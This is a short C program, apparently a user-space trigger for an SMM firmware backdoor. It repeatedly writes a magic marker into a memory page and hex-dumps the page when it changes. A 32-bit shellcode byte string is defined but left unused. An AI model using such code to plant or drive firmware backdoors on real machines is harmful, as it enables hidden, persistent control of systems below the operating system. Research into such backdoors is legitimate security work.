#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>

void _print_hex(const char *what, const void *v, const unsigned long l) {
  const unsigned char *p = v;
  unsigned long x, y = 0, z;
  printf("%s contents: \n", what);
  for (x = 0; x < l;) {
    printf("%02x ", p[x]);
    if (!(++x % 16) || x == l) {
      if ((x % 16) != 0) {
        z = 16 - (x % 16);
        if (z >= 8)
          printf(" ");
        for (; z != 0; --z) {
          printf("   ");
        }
      }
      printf(" | ");
      for (; y < x; y++) {
        if ((y % 8) == 0)
          printf(" ");
        if (isgraph(p[y]))
          printf("%c", p[y]);
        else
          printf(".");
      }
      printf("\n");
    } else if ((x % 8) == 0) {
      printf(" ");
    }
  }
}

#define PATTERN	"!$SMMBACKDOOR$!"

static void *p;

static __always_inline void *__memcpy(void *to, const void *from, size_t n)
{
	int d0, d1, d2;
	asm volatile("rep ; movsl\n\t"
		     "movl %4,%%ecx\n\t"
		     "andl $3,%%ecx\n\t"
		     "jz 1f\n\t"
		     "rep ; movsb\n\t"
		     "1:"
		     : "=&c" (d0), "=&D" (d1), "=&S" (d2)
		     : "0" (n / 4), "g" (n), "1" ((long)to), "2" ((long)from)
		     : "memory");
	return to;
}

static int gadget(void)
{
    return 0x9;
}

static char *shellcode = 
"\x55\x89\xe5\xe8\xfc\xff\xff\xff"
"\x05\x01\x00\x00\x00\x8b\x45\x08"
"\x5d\xc3\x55\x89\xe5\x53\x83\xec"
"\x04\xe8\xfc\xff\xff\xff\x05\x01"
"\x00\x00\x00\x83\xec\x0c\x6a\x06"
"\x89\xc3\xe8\xfc\xff\xff\xff\x83"
"\xc4\x10\x8b\x5d\xfc\xc9\xc3\x8b"
"\x04\x24\xc3"

;

int main(void)
{
	unsigned char *q;

	p = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (p == MAP_FAILED)
		err(EXIT_FAILURE, "mmap");

	q = p;
//	memcpy(q, PATTERN, sizeof(PATTERN)-1);
//	q += sizeof(PATTERN)-1;
//	memcpy(q, shellcode, 1024);

    for (;;) {
        memcpy(q, PATTERN, sizeof(PATTERN)-1);
        if (0 != memcmp(q, PATTERN, sizeof(PATTERN)-1)) {
            _print_hex("kernel", q, 32);
//            exit(1);
        }
    }

    return EXIT_SUCCESS;
}
